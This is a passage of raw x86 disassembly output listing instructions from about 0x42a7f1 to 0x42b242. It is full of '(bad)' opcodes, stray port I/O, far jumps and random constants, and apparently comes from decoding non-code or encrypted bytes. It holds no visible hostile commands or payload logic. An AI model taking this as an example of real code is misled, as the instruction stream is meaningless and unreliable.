  42a7f1:	add    ah,BYTE PTR [edx]
  42a7f3:	adc    eax,0x215f1aed
  42a7f8:	cmc    
  42a7f9:	icebp  
  42a7fa:	sub    esi,ebx
  42a7fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7fd:	idiv   DWORD PTR [ebx+0x46]
  42a800:	push   0x5d1db9d9
  42a805:	mov    DWORD PTR [edx+eiz*1+0x59b71ee3],eax
  42a80c:	paddw  mm1,QWORD PTR [ebx+0x23]
  42a810:	mov    ds:0x5cd9fa20,al
  42a815:	mov    ah,0xd6
  42a817:	mov    esp,0x88d45623
  42a81c:	into   
  42a81d:	xor    ch,BYTE PTR [edi]
  42a81f:	cwde   
  42a820:	fs push cs
  42a822:	mov    eax,eax
  42a824:	test   al,0x1d
  42a826:	int3   
  42a827:	pop    eax
  42a828:	cwde   
  42a829:	sbb    BYTE PTR [ecx+0x18b5ea75],dh
  42a82f:	repnz lds eax,FWORD PTR [ebp+0x11]
  42a833:	xchg   DWORD PTR [eax-0x388514d6],ebx
  42a839:	repz and bl,BYTE PTR [ecx+0x14]
  42a83d:	fnstcw WORD PTR [ebx]
  42a83f:	mov    ch,0xf5
	...
  42a8b1:	add    BYTE PTR [eax],al
  42a8b3:	add    BYTE PTR [edi+0x68],dl
  42a8b6:	fistp  QWORD PTR fs:[edi-0x21]
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	mov    al,ds:0x9f1b1259
  42a8c5:	ret    0x1
  42a8c8:	cmc    
  42a8c9:	add    BYTE PTR [eax],al
  42a8cb:	add    BYTE PTR [ebp+0x241d721d],al
  42a8d1:	mov    ds:0x35fa514b,al
  42a8d6:	fs dec ecx
  42a8d8:	out    0x13,al
  42a8da:	xor    DWORD PTR [eax],eax
  42a8dc:	lods   eax,DWORD PTR ds:[esi]
  42a8dd:	push   es
  42a8de:	mov    edi,0xe2d0ef22
  42a8e3:	cmp    al,0xd5
  42a8e5:	and    edx,DWORD PTR [esi]
  42a8e7:	mov    cl,0xac
  42a8e9:	lds    ecx,FWORD PTR [si+0x6a7f]
  42a8ee:	lods   al,BYTE PTR ds:[esi]
  42a8ef:	(bad)  
  42a8f0:	cmp    BYTE PTR [edi+0x13],dl
  42a8f3:	xchg   BYTE PTR [esi-0x69],bl
  42a8f6:	adc    edi,eax
  42a8f8:	sahf   
  42a8f9:	cmp    ah,ah
  42a8fb:	mov    al,0xa
  42a8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8fe:	mov    dl,0xbd
  42a900:	iret   
  42a901:	add    DWORD PTR [esi+0x649302c6],esi
  42a907:	jo     0x42a8d1
  42a909:	push   0xbe36af8f
  42a90e:	scas   al,BYTE PTR es:[edi]
  42a90f:	sahf   
  42a910:	ja     0x42a8de
  42a912:	mov    ecx,ds
  42a914:	jmp    0x4a56:0x5265bbda
  42a91b:	push   ebp
  42a91c:	pop    eax
  42a91d:	and    al,0x70
  42a91f:	ins    BYTE PTR es:[edi],dx
  42a920:	shl    edi,0x4
  42a923:	cmp    cl,BYTE PTR [edx+0x508f7ba5]
  42a929:	cwde   
  42a92a:	rcr    bh,cl
  42a92c:	jl     0x42a8e4
  42a92e:	inc    edx
  42a92f:	xor    edi,DWORD PTR [edi]
  42a931:	imul   edi,DWORD PTR [ebx+ecx*4+0x63e764c1],0x3
  42a939:	es mov ecx,0xd720dcf8
  42a93f:	fsubr  DWORD PTR [edi+0x25bf9dc5]
  42a945:	xor    cl,0xac
  42a948:	sub    dl,BYTE PTR [ebx+0x1ae165c2]
  42a94e:	stc    
  42a94f:	push   ss
  42a950:	jnp    0x42a9b3
  42a952:	mov    ecx,0x62c5b27b
  42a957:	and    eax,0xc537390c
  42a95c:	pop    edx
  42a95d:	lods   eax,DWORD PTR ds:[esi]
  42a95e:	ret    0x136c
  42a961:	mov    eax,0xb5a6ec39
  42a966:	add    eax,0xc3beefbf
  42a96b:	ins    DWORD PTR es:[edi],dx
  42a96c:	repnz imul edi,DWORD PTR [edx+ebx*8-0x1ed5c5af],0xc280b0aa
  42a978:	in     eax,0x8a
  42a97a:	and    DWORD PTR [edi-0x6d69af0e],0x32
  42a981:	das    
  42a982:	add    edi,DWORD PTR [eax-0x35befeb4]
  42a988:	adc    eax,0xf72f6eec
  42a98d:	inc    eax
  42a98e:	xchg   BYTE PTR [esi],bh
  42a990:	inc    ebp
  42a991:	ins    DWORD PTR es:[edi],dx
  42a992:	out    0xda,al
  42a994:	push   ebx
  42a995:	sbb    al,0x72
  42a997:	push   eax
  42a998:	adc    dl,bl
  42a99a:	daa    
  42a99b:	xchg   ebx,eax
  42a99c:	cmp    cl,ah
  42a99e:	mov    esp,0xe318b09a
  42a9a3:	xor    al,0x6b
  42a9a5:	push   cs
  42a9a6:	or     DWORD PTR [ecx-0x435e93d2],edx
  42a9ac:	mov    ah,BYTE PTR [esi-0x5e]
  42a9af:	and    esp,ebp
  42a9b1:	and    cl,BYTE PTR [edx]
  42a9b3:	ret    0x5494
  42a9b6:	or     edi,eax
  42a9b8:	or     BYTE PTR [ecx-0x7441a4c5],0x27
  42a9bf:	jmp    0x42a9ca
	...
  42aa34:	into   
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	and    bl,BYTE PTR [ebx-0x3c6b39b1]
  42aa46:	add    DWORD PTR [eax],eax
  42aa48:	cmc    
  42aa49:	add    BYTE PTR [eax],al
  42aa4b:	add    BYTE PTR [ecx],bl
  42aa4d:	call   0x81d038c8
  42aa52:	sbb    ebp,DWORD PTR [eax+0x47]
  42aa55:	mov    dl,0x7a
  42aa57:	lods   eax,DWORD PTR ds:[esi]
  42aa58:	es push ecx
  42aa5a:	mov    esi,0xa145c247
  42aa5f:	nop
  42aa60:	jo     0x42a9f3
  42aa62:	in     al,dx
  42aa63:	pushf  
  42aa64:	inc    eax
  42aa65:	cmp    eax,0xbebcb5ee
  42aa6a:	inc    ebp
  42aa6b:	cli    
  42aa6c:	mov    ebp,0x670b3e6b
  42aa71:	push   cs
  42aa72:	xor    ch,BYTE PTR [ebx]
  42aa74:	pushf  
  42aa75:	or     eax,0x28d81172
  42aa7a:	sbb    edx,ebp
  42aa7c:	xor    edx,esi
  42aa7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa7f:	out    0xbb,al
  42aa81:	mov    esi,0x53690ba
  42aa86:	pop    esi
  42aa87:	addr16 es pop ss
  42aa8a:	mov    bl,0xf3
  42aa8c:	xlat   BYTE PTR ds:[ebx]
  42aa8d:	divps  xmm5,XMMWORD PTR [ebx-0x7f]
  42aa91:	mov    dl,0xee
  42aa93:	and    BYTE PTR [ebx+ebp*8],0x25
  42aa97:	mov    ebp,0x54a873bd
  42aa9c:	test   ah,0xc9
  42aa9f:	mov    ch,0x6b
  42aaa1:	ja     0x42aa4f
  42aaa3:	sbb    ah,BYTE PTR ds:0x4456eb0a
  42aaa9:	leave  
  42aaaa:	jbe    0x42aa58
  42aaac:	loopne 0x42aa8c
  42aaae:	sbb    BYTE PTR [ebx+0x32eb40ab],bh
  42aab4:	or     al,0x9
  42aab6:	inc    ecx
  42aab7:	push   edx
  42aab8:	cdq    
  42aab9:	or     BYTE PTR [edi+0x48],bh
  42aabc:	(bad)  
  42aabd:	mov    ebp,0x4c725af3
  42aac2:	out    0x37,eax
  42aac4:	push   ecx
  42aac5:	cmp    esi,DWORD PTR ds:0xfc11b57e
  42aacb:	dec    ebx
  42aacc:	hlt    
  42aacd:	mov    al,0x2e
  42aacf:	sub    eax,0x5cb32031
  42aad4:	clc    
  42aad5:	fs (bad) 
  42aad7:	neg    DWORD PTR [edi+eiz*2-0xe]
  42aadb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aadc:	jp     0x42aabd
  42aade:	imul   esi,DWORD PTR [esi+0x28],0x2128517f
  42aae5:	mul    BYTE PTR [edi]
  42aae7:	add    eax,0x25e77a88
  42aaec:	cdq    
  42aaed:	push   edi
  42aaee:	push   esi
  42aaef:	xchg   esp,eax
  42aaf0:	and    edi,ecx
  42aaf2:	mov    BYTE PTR [edx-0x4e],bh
  42aaf5:	(bad)  
  42aaf6:	cmp    eax,0x4644abfc
  42aafb:	dec    esi
  42aafc:	cmp    al,0x0
  42aafe:	out    dx,al
  42aaff:	ds out 0xd4,eax
  42ab02:	sub    eax,0xc1819014
  42ab07:	jnp    0x42aaae
  42ab09:	out    0x1f,al
  42ab0b:	jg     0x42aad0
  42ab0d:	and    eax,0x707d3e55
  42ab12:	shl    BYTE PTR [ebx+0x31],0x6
  42ab16:	ds mov ecx,0x3860b7b
  42ab1c:	pop    edx
  42ab1d:	outs   dx,DWORD PTR ds:[esi]
  42ab1e:	xchg   edx,eax
  42ab1f:	adc    ebp,DWORD PTR [ebx+0x62]
  42ab22:	jge    0x42ab67
  42ab24:	rcl    DWORD PTR [ebx-0x41c93bce],0x7f
  42ab2b:	rcl    BYTE PTR [edi+0x25],0xf5
  42ab2f:	std    
  42ab30:	mov    ds:0xf2100dec,al
  42ab35:	sub    BYTE PTR [edx+0x1257acfc],ah
  42ab3b:	or     BYTE PTR [esp+ebp*4+0x3a53d1],dl
	...
  42abb2:	add    BYTE PTR [eax],al
  42abb4:	mov    ds:0xb788a616,eax
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	sbb    eax,0x89f02e87
  42abc5:	les    eax,FWORD PTR [ecx]
  42abc7:	add    ch,dh
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    dl,dh
  42abcd:	pushf  
  42abce:	(bad)  
  42abd0:	and    al,bh
  42abd2:	cmp    al,0xce
  42abd4:	mov    eax,0x981fe6d9
  42abd9:	and    eax,0x9ddb1c86
  42abde:	and    DWORD PTR [ecx+0x7c],edx
  42abe1:	call   0x8a9010db
  42abe6:	mov    dl,0x4f
  42abe8:	fisttp WORD PTR [ebp+0x34]
  42abeb:	lds    ebp,FWORD PTR [eax-0x71]
  42abee:	mov    dh,0xb5
  42abf0:	mov    eax,ds:0x15b9bb03
  42abf5:	sub    esi,DWORD PTR [ebp+0x6e]
  42abf8:	xchg   edi,eax
  42abf9:	or     eax,DWORD PTR [ebx+0x1a829930]
  42abff:	imul   edi,DWORD PTR [ecx+0x45076888],0x73
  42ac06:	dec    edi
  42ac07:	imul   edi,edi,0xfffffffe
  42ac0a:	outs   dx,DWORD PTR ds:[esi]
  42ac0b:	in     al,0x33
  42ac0d:	pop    esp
  42ac0e:	jmp    0x42abff
  42ac10:	dec    eax
  42ac11:	mov    edx,0xc2939041
  42ac16:	mov    WORD PTR [edi-0x73],ss
  42ac19:	ins    DWORD PTR es:[edi],dx
  42ac1a:	adc    BYTE PTR [ebp+ebp*4+0x56],cl
  42ac1e:	mov    gs,WORD PTR [edx]
  42ac20:	loope  0x42abb2
  42ac22:	jno    0x42abf7
  42ac24:	mov    ds:0xa4e8ce7e,al
  42ac29:	idiv   DWORD PTR [edi-0xf]
  42ac2c:	pop    ebx
  42ac2d:	xchg   edx,eax
  42ac2e:	mov    cl,bh
  42ac30:	repnz or DWORD PTR fs:[ebx+0x34],ebp
  42ac35:	xor    DWORD PTR [edx+ebp*8+0x4a8eaac2],0x6dccab4e
  42ac40:	pop    ds
  42ac41:	xor    al,0x1c
  42ac43:	int3   
  42ac44:	push   es
  42ac45:	sbb    DWORD PTR [edi+eax*1+0x4fba14a3],ebp
  42ac4c:	xchg   DWORD PTR [ecx-0x6d],edx
  42ac4f:	jmp    0x42abd4
  42ac51:	jne    0x42ac7c
  42ac53:	xchg   ebx,eax
  42ac54:	xor    BYTE PTR [ecx],dh
  42ac56:	mov    esi,DWORD PTR [eax]
  42ac58:	jo     0x42abff
  42ac5a:	lar    ecx,ax
  42ac5d:	std    
  42ac5e:	fs jle 0x42ac5e
  42ac61:	mov    eax,0x964d508f
  42ac66:	dec    edx
  42ac67:	add    BYTE PTR [esi+0x301b4472],0x2a
  42ac6e:	out    0xd2,al
  42ac70:	mov    BYTE PTR [ebp+0x9],0x4d
  42ac74:	sub    esp,DWORD PTR [ebx-0x3e7206e3]
  42ac7a:	mov    ecx,0x42a91296
  42ac7f:	sti    
  42ac80:	outs   dx,BYTE PTR ds:[esi]
  42ac81:	fbld   TBYTE PTR [eax+ebx*1-0x62]
  42ac85:	sub    eax,ebp
  42ac87:	lods   al,BYTE PTR ds:[esi]
  42ac88:	lods   eax,DWORD PTR ds:[esi]
  42ac89:	jbe    0x42ac3e
  42ac8b:	arpl   WORD PTR [edx-0x798ac9a8],cx
  42ac91:	and    DWORD PTR [edi],0xd943695c
  42ac97:	jns    0x42ac94
  42ac99:	jno    0x42ace1
  42ac9b:	jge    0x42ad02
  42ac9d:	pop    esp
  42ac9e:	sbb    BYTE PTR [edi-0x5f3df01e],ah
  42aca4:	test   DWORD PTR [esi+edi*2],edx
  42aca7:	test   dh,0x46
  42acaa:	add    al,BYTE PTR [eax]
  42acac:	out    0xf6,eax
  42acae:	or     eax,0xff09c433
  42acb3:	push   ecx
  42acb4:	xchg   edi,eax
  42acb5:	xlat   BYTE PTR ds:[ebx]
  42acb6:	ret    
  42acb7:	out    dx,al
  42acb8:	fidivr DWORD PTR [ebx]
  42acba:	adc    ah,BYTE PTR [edx]
  42acbc:	add    BYTE PTR [edx+0x6b],0xe5
  42acc0:	fwait
	...
  42ad31:	add    BYTE PTR [eax],al
  42ad33:	add    BYTE PTR [ebx-0x13f33b49],bl
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	movhlps xmm5,xmm5
  42ad42:	out    0x1,al
  42ad44:	jle    0x42ad0b
  42ad46:	add    DWORD PTR [eax],eax
  42ad48:	cmc    
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    cl,dh
  42ad4d:	je     0x42ad76
  42ad4f:	mov    bl,0xe0
  42ad51:	push   eax
  42ad52:	test   al,0xdf
  42ad54:	call   0xa460:0xc9052047
  42ad5b:	(bad)  
  42ad5c:	in     eax,dx
  42ad5d:	jmp    0xfe1cdc4e
  42ad62:	retf   
  42ad63:	inc    esp
  42ad64:	pusha  
  42ad65:	push   edi
  42ad66:	inc    ecx
  42ad67:	std    
  42ad68:	jecxz  0x42ad30
  42ad6a:	int3   
  42ad6b:	ins    BYTE PTR es:[edi],dx
  42ad6c:	mov    dh,0x2c
  42ad6e:	jp     0x42ad37
  42ad70:	sbb    BYTE PTR [edi+0x64],dh
  42ad73:	add    esi,DWORD PTR [edx+0x71aeef84]
  42ad79:	popf   
  42ad7a:	dec    ebp
  42ad7b:	loope  0x42ad16
  42ad7d:	cmc    
  42ad7e:	(bad)  
  42ad7f:	jo     0x42ada9
  42ad81:	adc    esi,ebp
  42ad83:	xchg   BYTE PTR [edi],al
  42ad85:	cmp    al,BYTE PTR [edx]
  42ad87:	ins    BYTE PTR es:[edi],dx
  42ad88:	push   esi
  42ad89:	cmp    ebp,DWORD PTR [edx+0x1f479c6b]
  42ad8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad90:	push   0xffffff93
  42ad92:	cli    
  42ad93:	add    DWORD PTR [esi],eax
  42ad95:	lea    esi,[edx-0x28]
  42ad98:	inc    edx
  42ad99:	xrelease xchg DWORD PTR [esi-0x15614915],edi
  42ada0:	lods   eax,DWORD PTR ds:[esi]
  42ada1:	in     eax,0x4b
  42ada3:	adc    BYTE PTR [esi],bh
  42ada5:	loopne 0x42adb1
  42ada7:	rcl    BYTE PTR [ecx+ebp*4],0x6f
  42adab:	es scas al,BYTE PTR es:[edi]
  42adad:	jo     0x42ad95
  42adaf:	pop    eax
  42adb0:	(bad)  
  42adb1:	in     al,dx
  42adb2:	out    dx,eax
  42adb3:	popa   
  42adb4:	mov    ss,WORD PTR [ebx+0x4d66ebd]
  42adba:	and    edx,DWORD PTR [edx-0x54cd1649]
  42adc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42adc1:	loope  0x42ae1f
  42adc3:	call   0x54df:0x2010e508
  42adca:	dec    eax
  42adcb:	cli    
  42adcc:	or     ch,BYTE PTR [edx+0xbb175f4]
  42add2:	push   eax
  42add3:	adc    esi,ebx
  42add5:	ror    DWORD PTR [ebp-0x57e0d244],cl
  42addb:	sbb    al,0xfe
  42addd:	jle    0x42ae2c
  42addf:	nop
  42ade0:	sbb    bl,BYTE PTR [eax]
  42ade2:	int3   
  42ade3:	int    0x64
  42ade5:	sub    BYTE PTR [esi+ebp*4-0x2],ah
  42ade9:	pop    ebp
  42adea:	push   ecx
  42adeb:	push   eax
  42adec:	inc    esi
  42aded:	out    0xfc,al
  42adef:	push   eax
  42adf0:	dec    edx
  42adf1:	fs repz mov bh,0xef
  42adf5:	push   eax
  42adf6:	into   
  42adf7:	call   0xa5a31e82
  42adfc:	cmp    ecx,edi
  42adfe:	ficom  WORD PTR [esi]
  42ae00:	mov    bh,0x7b
  42ae02:	lea    edi,[edi]
  42ae04:	loopne 0x42add4
  42ae06:	jmp    FWORD PTR [esi-0x7e]
  42ae09:	jo     0x42adc4
  42ae0b:	sub    al,0x6b
  42ae0d:	pop    ecx
  42ae0e:	hlt    
  42ae0f:	imul   ecx,ebx,0x59
  42ae12:	cmp    BYTE PTR [ecx-0xb],cl
  42ae15:	adc    eax,0xb0bc51c0
  42ae1a:	sbb    eax,0x3744c474
  42ae1f:	dec    eax
  42ae20:	ror    BYTE PTR ds:0x8a2f1c88,cl
  42ae26:	and    eax,0x82d77d17
  42ae2b:	aam    0x7
  42ae2d:	fldcw  WORD PTR [ecx-0x6f]
  42ae30:	or     BYTE PTR [edx+0x68],bl
  42ae33:	mov    al,0xcf
  42ae35:	test   eax,0x27a8e01
  42ae3a:	mov    eax,ds:0x71e62a42
  42ae3f:	in     eax,0x7f
	...
  42aeb1:	add    BYTE PTR [eax],al
  42aeb3:	add    BYTE PTR [ecx],dh
  42aeb5:	inc    ebp
  42aeb6:	enter  0xfc06,0x8f
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	sbb    bl,BYTE PTR [eax+esi*8-0x30]
  42aec4:	jae    0x42ae8c
  42aec6:	add    DWORD PTR [eax],eax
  42aec8:	cmc    
  42aec9:	add    BYTE PTR [eax],al
  42aecb:	add    BYTE PTR [eax+0x29],al
  42aece:	lea    ecx,[esi-0x45]
  42aed1:	idiv   BYTE PTR ds:0xcfb6365b
  42aed7:	mov    edx,eax
  42aed9:	imul   eax,DWORD PTR [eax-0x7ea2cf8e],0x1f982a43
  42aee3:	stos   DWORD PTR es:[edi],eax
  42aee4:	stos   DWORD PTR es:[edi],eax
  42aee5:	ret    
  42aee6:	or     ch,ch
  42aee8:	out    dx,al
  42aee9:	inc    esp
  42aeea:	pop    ecx
  42aeeb:	(bad)  
  42aeec:	scas   al,BYTE PTR es:[edi]
  42aeed:	(bad)  
  42aeee:	pop    edi
  42aeef:	outs   dx,DWORD PTR ds:[esi]
  42aef0:	fmul   st(7),st
  42aef2:	xor    ecx,0xffffff9a
  42aef5:	push   cs
  42aef6:	xlat   BYTE PTR ds:[ebx]
  42aef7:	cs in  eax,dx
  42aef9:	mov    cl,0x5a
  42aefb:	and    ch,BYTE PTR [esi]
  42aefd:	xor    eax,0x65a930b8
  42af02:	mov    ch,dl
  42af04:	enter  0x2bc6,0xe3
  42af08:	ret    0xb89f
  42af0b:	push   ecx
  42af0c:	jb     0x42af36
  42af0e:	test   ch,dl
  42af10:	pop    esp
  42af11:	mov    bl,0xa9
  42af13:	shl    DWORD PTR [ebp-0x6a],cl
  42af16:	mov    ch,0x27
  42af18:	adc    al,0x8f
  42af1a:	inc    esp
  42af1b:	iret   
  42af1c:	or     BYTE PTR [esi],0xfe
  42af1f:	fwait
  42af20:	adc    edi,ebp
  42af22:	add    al,0x16
  42af24:	inc    ecx
  42af25:	test   eax,0x1378f8fc
  42af2a:	pop    ss
  42af2b:	jo     0x42aed9
  42af2d:	sub    BYTE PTR [eax],ah
  42af2f:	pop    esi
  42af30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af31:	mov    dh,ah
  42af33:	cs into 
  42af35:	and    al,0x70
  42af37:	in     eax,0xf5
  42af39:	ret    0x1e44
  42af3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af3d:	aaa    
  42af3e:	pushf  
  42af3f:	jle    0x42afa6
  42af41:	mov    ch,0x39
  42af43:	fbstp  TBYTE PTR [ecx-0x25]
  42af46:	fbld   TBYTE PTR [ecx-0x9ff77b1]
  42af4c:	dec    edx
  42af4d:	gs mov al,0x8d
  42af50:	pushf  
  42af51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af52:	mov    dh,0x18
  42af54:	leave  
  42af55:	arpl   WORD PTR [edi+0x5f],bp
  42af58:	aad    0x2a
  42af5a:	dec    ebx
  42af5b:	stos   DWORD PTR es:[di],eax
  42af5d:	inc    esi
  42af5e:	pop    edx
  42af5f:	mov    eax,DWORD PTR [ebp-0xc553dfe]
  42af65:	xchg   ecx,eax
  42af66:	adc    al,0xda
  42af68:	mov    edx,0xe50311ef
  42af6d:	sbb    DWORD PTR [ebx],ebx
  42af6f:	stos   DWORD PTR es:[edi],eax
  42af70:	leave  
  42af71:	lahf   
  42af72:	inc    ecx
  42af73:	inc    esi
  42af74:	mov    cl,0x7
  42af76:	popf   
  42af77:	add    al,0xf
  42af79:	(bad)  
  42af7a:	sub    al,0x47
  42af7c:	outs   dx,DWORD PTR ds:[esi]
  42af7d:	xor    ebx,DWORD PTR [edx+0x3040c9b3]
  42af83:	aaa    
  42af84:	adc    eax,0xb7546f46
  42af89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af8a:	(bad)  
  42af8b:	test   eax,0xf19bf8d1
  42af90:	jb     0x42afe6
  42af92:	jl     0x42af92
  42af94:	ds jnp 0x42af4e
  42af97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af98:	shl    BYTE PTR [eax],1
  42af9a:	xor    al,0x0
  42af9c:	scas   al,BYTE PTR es:[edi]
  42af9d:	adc    bh,BYTE PTR [edi-0xfcf8b44]
  42afa3:	imul   esi,esi,0xffffff80
  42afa6:	mov    ah,0x8c
  42afa9:	not    DWORD PTR [esi]
  42afab:	cs int3 
  42afad:	push   ecx
  42afae:	xor    DWORD PTR [ecx+0x1b2f3118],ecx
  42afb4:	mov    dl,0x37
  42afb6:	int3   
  42afb7:	lods   eax,DWORD PTR ds:[esi]
  42afb8:	fucomi st,st(4)
  42afba:	sbb    eax,0x3b11ed1c
  42afbf:	fnstenv [edi+0x0]
	...
  42b031:	add    BYTE PTR [eax],al
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0xb873
  42b042:	cli    
  42b043:	mov    ch,0x68
  42b045:	mov    DWORD PTR [ecx],0xf500
  42b04b:	add    BYTE PTR [esi+0x40],dl
  42b04e:	dec    edi
  42b04f:	cmc    
  42b050:	add    esi,DWORD PTR [eax]
  42b052:	dec    ebx
  42b053:	test   BYTE PTR es:[ebx],0x39
  42b057:	mov    al,ds:0x70ba554
  42b05c:	sub    BYTE PTR [ebp+0x17],ah
  42b05f:	jmp    0x69597f78
  42b064:	sub    ebp,esp
  42b066:	repnz fwait
  42b068:	inc    esp
  42b069:	add    eax,0xb4436c73
  42b06e:	sbb    edi,0x7
  42b071:	pusha  
  42b072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b073:	(bad)  
  42b074:	and    eax,0x3b777d80
  42b079:	xchg   ecx,eax
  42b07a:	cmp    ah,BYTE PTR [edx+0x212b366b]
  42b080:	ja     0x42b0c8
  42b082:	jl     0x42b0ff
  42b084:	jne    0x42b0f2
  42b086:	outs   dx,DWORD PTR ds:[esi]
  42b087:	mov    ebx,0x3057fa71
  42b08c:	and    DWORD PTR [edx+0x71b13258],0x35
  42b093:	mov    dl,0xb4
  42b095:	cs fmul st,st(1)
  42b098:	clc    
  42b099:	xor    ebx,0xef03e808
  42b09f:	pop    ss
  42b0a0:	shl    DWORD PTR [eax],0x2d
  42b0a3:	add    eax,0xd4c2d842
  42b0a8:	and    edi,edx
  42b0aa:	pusha  
  42b0ab:	stos   DWORD PTR es:[edi],eax
  42b0ac:	fdiv   st,st(2)
  42b0ae:	push   es
  42b0af:	mov    ecx,ds
  42b0b1:	or     ebp,DWORD PTR ds:0xbecd54a6
  42b0b7:	int3   
  42b0b8:	mov    ah,0x21
  42b0ba:	fisttp WORD PTR [esi+0x30df5b73]
  42b0c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0c1:	xor    eax,0x3d544f37
  42b0c6:	cmp    dh,BYTE PTR [esi-0x4d]
  42b0c9:	fimul  WORD PTR [ebx+0x799b9475]
  42b0cf:	xchg   ebp,eax
  42b0d0:	stos   DWORD PTR es:[edi],eax
  42b0d1:	dec    eax
  42b0d2:	stos   DWORD PTR es:[edi],eax
  42b0d3:	push   cs
  42b0d4:	adc    ebp,DWORD PTR [esi]
  42b0d6:	nop
  42b0d7:	xchg   edx,eax
  42b0d8:	dec    ecx
  42b0d9:	mov    dh,al
  42b0db:	mov    dh,0xf6
  42b0dd:	inc    ebp
  42b0de:	cdq    
  42b0df:	jle    0x42b137
  42b0e1:	rol    DWORD PTR [ebx+ecx*1+0x1a92b83c],0x28
  42b0e9:	sahf   
  42b0ea:	xchg   bl,dl
  42b0ec:	inc    esi
  42b0ed:	xchg   edi,eax
  42b0ee:	je     0x42b0b3
  42b0f0:	and    eax,ebp
  42b0f2:	jnp    0x42b089
  42b0f4:	push   ebx
  42b0f5:	cld    
  42b0f6:	stos   BYTE PTR es:[edi],al
  42b0f7:	add    eax,0xd348ec9d
  42b0fc:	in     al,dx
  42b0fd:	lock sbb bl,dh
  42b100:	into   
  42b101:	dec    ebp
  42b102:	lahf   
  42b103:	enter  0x6d16,0xe0
  42b107:	inc    esi
  42b108:	dec    esi
  42b109:	repnz sti 
  42b10b:	fmul   st,st(3)
  42b10d:	xor    cl,ch
  42b10f:	jecxz  0x42b102
  42b111:	inc    ecx
  42b112:	mov    dh,0x42
  42b114:	xor    ebp,0x4cf6993c
  42b11a:	push   edi
  42b11b:	repnz dec ecx
  42b11d:	lea    esi,[edi-0x6f]
  42b120:	loop   0x42b183
  42b122:	popf   
  42b123:	cmc    
  42b124:	popa   
  42b125:	jns    0x42b15d
  42b127:	ss jo  0x42b0df
  42b12a:	sub    eax,0xb67d2863
  42b12f:	inc    ebx
  42b130:	(bad)  
  42b131:	xor    BYTE PTR [edi+edi*8+0x11e8932a],0xd8
  42b139:	sbb    eax,0xbe225a83
  42b13e:	daa    
  42b13f:	lds    eax,FWORD PTR gs:[eax]
	...
  42b1b2:	add    BYTE PTR [eax],al
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	imul   ecx,DWORD PTR [eax],0xffffff90
  42b1c3:	rcr    DWORD PTR [ebp-0x38],cl
  42b1c6:	add    DWORD PTR [eax],eax
  42b1c8:	cmc    
  42b1c9:	add    BYTE PTR [eax],al
  42b1cb:	add    BYTE PTR [eax+0x7e61058c],al
  42b1d1:	dec    ebp
  42b1d2:	push   ss
  42b1d3:	sub    bl,BYTE PTR ss:[ecx+esi*8+0x2d]
  42b1d8:	dec    edx
  42b1d9:	(bad)  
  42b1da:	jns    0x42b1ae
  42b1dc:	adc    al,0x1c
  42b1de:	cmp    BYTE PTR [ecx-0x2b],ah
  42b1e1:	pop    eax
  42b1e2:	mov    bh,0x40
  42b1e4:	pop    ebp
  42b1e5:	inc    ebx
  42b1e6:	and    bl,BYTE PTR [ecx]
  42b1e8:	dec    ecx
  42b1e9:	adc    al,0x5f
  42b1eb:	out    dx,eax
  42b1ec:	fimul  DWORD PTR [ebx-0x63]
  42b1ef:	add    al,0x40
  42b1f1:	ss clc 
  42b1f3:	xchg   edi,eax
  42b1f4:	sti    
  42b1f5:	in     eax,0x68
  42b1f7:	push   esp
  42b1f8:	push   0xffffff84
  42b1fa:	jl     0x42b18a
  42b1fc:	loopne 0x42b1fc
  42b1fe:	inc    edi
  42b1ff:	clc    
  42b200:	ror    BYTE PTR [esi-0x30],0xbc
  42b204:	stc    
  42b205:	inc    esi
  42b206:	ds stos DWORD PTR es:[edi],eax
  42b208:	shr    ebx,cl
  42b20a:	xor    ecx,DWORD PTR [edi+0x22]
  42b20d:	js     0x42b19c
  42b20f:	ret    0x199b
  42b212:	aam    0x29
  42b214:	pop    ss
  42b215:	mov    ebx,ecx
  42b217:	push   esp
  42b218:	fs push ebp
  42b21a:	jnp    0x42b1bf
  42b21c:	push   ecx
  42b21d:	xchg   ebp,eax
  42b21e:	or     bh,ch
  42b220:	je     0x42b1b5
  42b222:	das    
  42b223:	pop    ds
  42b224:	inc    edi
  42b225:	pushf  
  42b226:	mov    ebp,0x80b9ee07
  42b22b:	mov    dl,0xb4
  42b22d:	xor    ebp,DWORD PTR [eax+0x60891138]
  42b233:	call   0xdf93cf02
  42b238:	xor    eax,0xea5f39be
  42b23d:	sub    edi,esp
  42b23f:	lahf   
  42b240:	jae    0x42b2ba
  42b242:	jne    0x42b1df
